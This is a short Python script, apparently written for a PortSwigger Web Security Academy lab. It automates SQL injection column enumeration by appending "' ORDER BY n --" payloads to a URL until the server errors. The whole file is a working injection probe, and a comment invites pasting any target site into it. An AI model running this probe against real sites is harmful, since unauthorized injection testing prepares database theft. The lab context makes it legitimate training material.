#This payload trys to find the number of colums in a table
import requests
ORDERpayloads = ["' ORDER BY "]
def order_injection(url):
    '''
    It iterates through a range from 0 to 49 (inclusive) using a for loop.
    Inside the loop, it constructs an SQL injection query by concatenating the elements from the ORDER_payloads list, the current index i converted to a string, and " -- " (which is a comment in SQL to ignore the rest of the query).
    It sends a GET request to the specified url concatenated with the constructed query using the requests.get() method.
    If the response status code is 200 (indicating a successful request), it prints a message indicating that the column with index i is present.
    '''
    print("Try to find out the number of colums using ORDER BY")
    for i in range(1,50):# using this becuase hypothetically the is no database with 50 columns
        query = ORDERpayloads[0] + str(i) + " -- "
        r = requests.get(url + query)
        if r.status_code == 200:
            print("Column {} is present".format(i))
        else:
            print("Total number of columns are {}".format(i-1))#
            return i
        
url = 'https://0a5f00fd03b033e38024901b00b90004.web-security-academy.net/filter?category=Pets'#this is where you paste the site to test the number of columns in the table.#this link is from port swigger
cols = order_injection(url)

